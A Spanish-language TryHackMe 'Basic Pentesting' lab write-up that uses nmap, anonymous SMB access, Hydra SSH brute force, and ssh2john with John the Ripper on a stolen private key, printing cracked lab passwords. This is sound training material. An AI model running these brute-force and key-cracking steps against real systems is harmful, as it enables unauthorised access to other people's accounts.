---
title: "Basic Pentesting - TryHackMe"
date: 2024-09-03 00:00:00 +0800
categories: [Ciberseguridad,Writeups,THM]
tags: [eJPT]
image: images/BasicPentesting/basicpentesting.png 
---

# Reconocimiento

El primer paso en la fase de reconocimiento fue verificar la conectividad con la máquina objetivo, asegurándome de que estaba en línea y accesible antes de continuar con el escaneo de puertos y la enumeración de servicios.

Ejecuté el siguiente comando `ping` para enviar un único paquete ICMP a la máquina con la dirección IP `10.10.210.76`:

```bash
ping -c 1 10.10.210.76
PING 10.10.210.76 (10.10.210.76) 56(84) bytes of data.
64 bytes from 10.10.210.76: icmp_seq=1 ttl=63 time=52.3 ms

--- 10.10.210.76 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 52.282/52.282/52.282/0.000 ms
```

# Escaneo 

Después de verificar la conectividad con la máquina objetivo, el siguiente paso fue realizar un escaneo de puertos para identificar los servicios que estaban disponibles. Utilicé `nmap` para realizar un escaneo de todos los puertos TCP.

```bash
sudo nmap -sS --min-rate 5000 -p- --open 10.10.210.76 -oN allPorts.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 12:14 CEST
sendto in send_ip_packet_sd: sendto(5, packet, 40, 0, 10.10.210.76, 16) => Operation not permitted
Offending packet: ICMP [10.9.215.134 > 10.10.210.76 Timestamp request (type=13/code=0) id=50598 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=4832 iplen=40 ]
Nmap scan report for 10.10.210.76
Host is up (0.054s latency).
Not shown: 55938 closed tcp ports (reset), 9591 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 18.65 seconds
```

# Enumeración

Después, quise saber qué servicios estaban corriendo en esos puertos y qué versiones estaban usando, así que utilicé `nmap` con opciones para detección de versiones y scripts:

```bash
sudo nmap -p 22,80,139,445,8009,8080 -sCV 10.10.210.76 -oN services.txt                                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 12:18 CEST
sendto in send_ip_packet_sd: sendto(6, packet, 40, 0, 10.10.210.76, 16) => Operation not permitted
Offending packet: ICMP [10.9.215.134 > 10.10.210.76 Timestamp request (type=13/code=0) id=46620 seq=0 orig=0 recv=0 trans=0] IP [ttl=39 id=44183 iplen=40 ]
Nmap scan report for 10.10.210.76
Host is up (0.054s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-09-02T10:18:28
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-09-02T06:18:28-04:00
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.00 seconds
```

# Exploración del servicio web

Sabía que el puerto 80 estaba abierto en el objetivo 10.10.210.76, así que decidí investigar más a fondo qué servicio web estaba expuesto en ese puerto.

![BasicPentesting](images/BasicPentesting/basicpentesting1.png)

Durante la fase de exploración del servicio web, utilicé el comando `nmap` con el script `http-enum` para identificar directorios y archivos potencialmente interesantes en el servidor web que opera en el puerto `80` del objetivo `10.10.210.76`. El comando ejecutado fue:

```bash
nmap --script http-enum 10.10.210.76 -p80      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 12:44 CEST
Nmap scan report for 10.10.210.76
Host is up (0.067s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /development/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
```

A continuación se muestra una captura de pantalla que representa el contenido del directorio `/development/` al acceder a través del navegador web. La imagen ilustra los archivos y subdirectorios visibles en este directorio.


![BasicPentesting](images/BasicPentesting/basicpentesting2.png)

He accedido al directorio /development/ en el servidor web y he capturado dos imágenes que muestran el contenido encontrado. A continuación, detallo lo que se muestra en cada una de las imágenes:

![BasicPentesting](images/BasicPentesting/basicpentesting3.png)
![BasicPentesting](images/BasicPentesting/basicpentesting4.png)


Como no encontré información relevante en los puertos previamente explorados y dado que las notas mencionaban usuarios, decidí investigar los recursos compartidos SMB en el servidor `10.10.210.76`. Utilicé el comando `smbclient` para acceder al recurso compartido Anonymous, que se había identificado anteriormente como accesible sin autenticación.

```bash
smbclient //10.10.210.76/Anonymous 
Password for [WORKGROUP\rumamr9]:
Try "help" to get a list of possible commands.
smb: \> 
```

Después de establecer una conexión exitosa con el recurso compartido Anonymous en el servidor 10.10.210.76, utilicé el comando dir para listar el contenido disponible en este recurso.

Dado el potencial interés del archivo staff.txt, decidí transferirlo a mi máquina local para su análisis posterior.

```bash
smbclient //10.10.210.76/Anonymous                        
Password for [WORKGROUP\rumamr9]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Apr 19 19:31:20 2018
  ..                                  D        0  Thu Apr 19 19:13:06 2018
  staff.txt                           N      173  Thu Apr 19 19:29:55 2018

                14318640 blocks of size 1024. 11091556 blocks available
smb: \> get staff.txt 
getting file \staff.txt of size 173 as staff.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \> 
```

Después de descargar el archivo staff.txt desde el recurso compartido Anonymous en el servidor `10.10.210.76`, procedí a revisar su contenido utilizando el comando cat.

```bash
cat staff.txt 
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

# Explotación

Dado que en el archivo staff.txt se mencionaban los usuarios "Jan" y "Kay", decidí realizar un ataque de fuerza bruta contra el servicio SSH del servidor 10.10.210.76, utilizando el nombre de usuario "jan" con la esperanza de descubrir su contraseña. Para ello, empleé la herramienta Hydra y el diccionario de contraseñas rockyou.txt.

```bash
sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.210.76 ssh 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-02 16:07:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.210.76:22/
[STATUS] 146.00 tries/min, 146 tries in 00:01h, 14344256 to do in 1637:29h, 13 active
[STATUS] 101.00 tries/min, 303 tries in 00:03h, 14344099 to do in 2367:01h, 13 active
[STATUS] 95.14 tries/min, 666 tries in 00:07h, 14343736 to do in 2512:40h, 13 active
[22][ssh] host: 10.10.210.76  login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-02 16:16:11
```

Tras descubrir la contraseña del usuario "jan" mediante un ataque de fuerza bruta en el servicio SSH, procedí a intentar un acceso SSH al servidor 10.10.210.76 utilizando dichas credenciales.

```bash
ssh jan@10.10.210.76                                                  
The authenticity of host '10.10.210.76 (10.10.210.76)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.210.76' (ED25519) to the list of known hosts.
jan@10.10.210.76's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$ 
```

Después de acceder al servidor como el usuario "jan", procedí a listar el contenido de su directorio home para identificar archivos y directorios presentes. Para ello, utilicé el comando ls -al, que muestra los detalles de permisos, propietarios y fechas de los archivos en formato largo, incluyendo archivos ocultos.

```bash
jan@basic2:~$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst
```

Una vez que conseguí acceso al sistema utilizando las credenciales de "jan", opté por investigar el directorio home de otro usuario, "kay", con la intención de encontrar información relevante. Para ello, ejecuté el comando ls -al, que me mostró una lista detallada de los archivos presentes en /home/kay, incluyendo archivos ocultos, así como sus permisos, propietarios y fechas de modificación.

```bash
jan@basic2:/home/kay$ ls -al
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
```

Uno de los archivos más relevantes que descubrimos es pass.bak. Sin embargo, para poder acceder y leer su contenido, es necesario tener privilegios del usuario "kay".

Accedimos al directorio .ssh del usuario "kay" y encontramos varios archivos, entre ellos el más notable es id_rsa, que es la clave privada SSH del usuario. Este archivo es de particular interés, ya que puede permitirnos acceder a otros sistemas o servicios donde "kay" tenga permisos, utilizando su clave privada. Aquí está el listado de archivos que encontramos:

```bash
jan@basic2:/home/kay/.ssh$ ls -al
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

Podemos utilizar la clave id_rsa para acceder a la máquina como el usuario "kay". Sin embargo, antes de proceder, debemos asegurarnos de ajustar los permisos de la clave para que sea utilizada correctamente. Esto implica configurar los permisos adecuados para que la clave privada sea legible solo por el usuario actual.

```bash
chmod 600 id_rsa
```

Una vez que hemos configurado los permisos adecuados para la clave id_rsa, podemos proceder a utilizarla para acceder a la máquina con autenticación basada en esta clave.

```bash
ssh kay@10.10.210.76 -i id_rsa
Enter passphrase for key 'id_rsa':
```

Dado que la clave id_rsa está encriptada y se nos solicita una contraseña para desencriptarla, podemos emplear la herramienta ssh2john para convertir la clave a un formato que sea compatible con John the Ripper. Esto nos permitirá intentar descifrar la contraseña de la clave y obtener acceso a la máquina.

```bash
ssh2john id_rsa > hash_id_rsa
```

Ahora que contamos con el hash generado a partir de la clave id_rsa, podemos suministrarlo a John the Ripper para que lleve a cabo un proceso de desciframiento y así intentar recuperar la contraseña original de la clave.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
Created directory: /home/rumamr9/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2023-05-20 00:16) 20.00g/s 1655Kp/s 1655Kc/s 1655KC/s behlat..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Hemos conseguido descifrar la contraseña de la clave id_rsa, lo que nos permite acceder a la máquina como el usuario "kay".

```bash
ssh kay@10.10.210.76 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$
```

Ahora que hemos accedido a la máquina como el usuario "kay", podemos proceder a obtener la flag final.

```bash
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
***********************************
```